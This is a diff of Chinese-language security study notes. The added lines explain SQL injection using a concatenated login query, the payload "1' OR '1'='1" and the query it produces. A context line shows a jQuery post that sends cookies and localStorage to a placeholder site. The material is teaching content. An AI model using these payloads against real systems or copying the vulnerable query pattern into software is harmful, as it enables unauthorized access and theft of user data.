@@ -41,4 +41,36 @@ $.post('https://我的站點/test',{cookie: test1,localStorage: test2})
 
 
 
+```
+var userName = req.body.username;
+var passWord = req.body.password;
+
+strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"
+```
+
+POST時將資料寫入
+
+```
+userName = "1' OR '1'='1";
+與
+passWord = "1' OR '1'='1";
+
+```
+將導致原本的SQL字串被填為
+
+```
+strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"
+```
+
+上述語句等同於
+
+```
+strSQL = "SELECT * FROM users;"
+```
+
+將會取出所有使用者
+
+https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A
+
+
 
